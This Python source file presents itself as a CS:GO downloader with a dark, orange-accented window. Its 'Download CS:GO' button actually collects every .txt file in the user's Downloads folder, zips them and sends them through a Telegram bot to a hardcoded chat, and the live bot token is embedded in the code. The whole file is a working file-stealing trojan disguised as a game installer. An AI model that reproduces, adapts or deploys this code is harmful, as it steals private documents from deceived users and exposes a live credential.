import telebot
import os
import zipfile
from datetime import datetime
import sys
from telebot.apihelper import ApiTelegramException
import tkinter as tk
from tkinter import messagebox

# Токен бота
TOKEN = '7830900342:AAFtd63btoDfM-FPtUdPb41Yzg-Pt2Z82-U'
bot = telebot.TeleBot(TOKEN)

# ID группы (замените на ваш)
CHAT_ID = 6054146925  # Получите через @userinfobot

# Путь к папке "Загрузки"
DOWNLOADS_DIR = os.path.join(os.path.expanduser("~"), "Downloads")
LOCK_FILE = os.path.join(DOWNLOADS_DIR, "send_txt.lock")

# Максимальный размер файла для Telegram (50 МБ)
MAX_FILE_SIZE = 50 * 1024 * 1024  # 50 МБ в байтах

class CSGOApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("CS:GO TXT Sender")
        self.geometry("400x300")
        self.configure(bg="#1a1a1a")  # Тёмный фон в стиле CS:GO
        self.resizable(False, False)

        # Стили
        self.csgo_font = ("Arial", 14, "bold")
        self.csgo_button_font = ("Arial", 12, "bold")
        self.csgo_bg = "#1a1a1a"
        self.csgo_fg = "#ff9900"  # Оранжевый акцент CS:GO
        self.csgo_button_bg = "#2a2a2a"
        self.csgo_button_active = "#4a4a4a"

        # Логотип или заголовок
        self.label = tk.Label(
            self,
            text="CS:GO TXT Sender",
            font=("Arial", 20, "bold"),
            fg=self.csgo_fg,
            bg=self.csgo_bg,
            pady=20
        )
        self.label.pack()

        # Статус
        self.status_label = tk.Label(
            self,
            text="Нажмите 'Скачать CS:GO' для отправки файлов",
            font=self.csgo_font,
            fg="#ffffff",
            bg=self.csgo_bg,
            wraplength=350
        )
        self.status_label.pack(pady=20)

        # Кнопка "Скачать CS:GO"
        self.download_button = tk.Button(
            self,
            text="Скачать CS:GO",
            font=self.csgo_button_font,
            bg=self.csgo_button_bg,
            fg=self.csgo_fg,
            activebackground=self.csgo_button_active,
            activeforeground=self.csgo_fg,
            command=self.send_txt_files,
            relief="flat",
            padx=20,
            pady=10
        )
        self.download_button.pack(pady=20)

    def check_lock(self):
        """Проверяет, запущено ли приложение."""
        if os.path.exists(LOCK_FILE):
            self.status_label.config(text="❌ Приложение уже было запущено ранее!")
            messagebox.showerror("Ошибка", "Приложение уже было запущено ранее!")
            return None
        return open(LOCK_FILE, 'w')

    def create_zip(self, txt_files, zip_name):
        """Создаёт ZIP-архив из списка файлов."""
        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file in txt_files:
                if os.path.getsize(file) > MAX_FILE_SIZE:
                    self.status_label.config(text=f"⚠️ Файл {os.path.basename(file)} слишком большой ({os.path.getsize(file) / 1024 / 1024:.2f} МБ), пропущен.")
                    return False
                zipf.write(file, os.path.basename(file))
        return True

    def send_txt_files(self):
        lock_file = None
        try:
            # Проверяем директорию
            if not os.path.exists(DOWNLOADS_DIR):
                self.status_label.config(text="📂 Папка Загрузки не найдена!")
                messagebox.showerror("Ошибка", "Папка Загрузки не найдена!")
                return

            # Проверяем блокировку
            lock_file = self.check_lock()
            if not lock_file:
                return

            # Находим все .txt файлы
            txt_files = [os.path.join(DOWNLOADS_DIR, f) for f in os.listdir(DOWNLOADS_DIR) if f.lower().endswith('.txt')]
            file_count = len(txt_files)

            if file_count == 0:
                self.status_label.config(text="📂 В Загрузках нет .txt файлов!")
                messagebox.showinfo("Информация", "В Загрузках нет .txt файлов!")
                os.remove(LOCK_FILE)
                return

            # Формируем сообщение
            message = f"📂 Нашёл {file_count} .txt файл{'ов' if file_count > 1 else ''} в Загрузках! 🚀"
            self.status_label.config(text=message)

            if file_count == 1:
                # Проверяем размер файла
                if os.path.getsize(txt_files[0]) > MAX_FILE_SIZE:
                    self.status_label.config(text=f"⚠️ Файл {os.path.basename(txt_files[0])} слишком большой ({os.path.getsize(txt_files[0]) / 1024 / 1024:.2f} МБ).")
                    messagebox.showerror("Ошибка", f"Файл {os.path.basename(txt_files[0])} слишком большой.")
                    os.remove(LOCK_FILE)
                    return
                # Отправляем один файл
                with open(txt_files[0], 'rb') as file:
                    bot.send_document(CHAT_ID, file, caption=message)
            else:
                # Создаём и отправляем архив
                zip_name = f"txt_files_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
                if not self.create_zip(txt_files, zip_name):
                    os.remove(LOCK_FILE)
                    return
                if not os.path.exists(zip_name) or os.path.getsize(zip_name) > MAX_FILE_SIZE:
                    self.status_label.config(text=f"⚠️ Архив {zip_name} слишком большой ({os.path.getsize(zip_name) / 1024 / 1024:.2f} МБ) или не создан.")
                    messagebox.showerror("Ошибка", f"Архив {zip_name} слишком большой или не создан.")
                    os.remove(LOCK_FILE)
                    if os.path.exists(zip_name):
                        os.remove(zip_name)
                    return
                with open(zip_name, 'rb') as zip_file:
                    bot.send_document(CHAT_ID, zip_file, caption=message)
                os.remove(zip_name)

            self.status_label.config(text=f"✅ Отправлено {file_count} файл{'ов' if file_count > 1 else ''} в группу!")
            messagebox.showinfo("Успех", f"Отправлено {file_count} файл{'ов' if file_count > 1 else ''} в группу!")
            lock_file.close()
        except ApiTelegramException as te:
            self.status_label.config(text=f"❌ Ошибка Telegram API: {str(te)}")
            messagebox.showerror("Ошибка", f"Telegram API: {str(te)}")
            if lock_file:
                lock_file.close()
                os.remove(LOCK_FILE)
        except PermissionError:
            self.status_label.config(text="❌ Ошибка: Нет доступа к файлу или директории!")
            messagebox.showerror("Ошибка", "Нет доступа к файлу или директории!")
            if lock_file:
                lock_file.close()
                os.remove(LOCK_FILE)
        except Exception as e:
            self.status_label.config(text=f"❌ Неизвестная ошибка: {str(e)}")
            messagebox.showerror("Ошибка", f"Неизвестная ошибка: {str(e)}")
            if lock_file:
                lock_file.close()
                os.remove(LOCK_FILE)

if __name__ == "__main__":
    if CHAT_ID == 'YOUR_CHAT_ID':
        print("❌ Ошибка: Укажите действительный CHAT_ID!")
        sys.exit(1)
    app = CSGOApp()
    app.mainloop()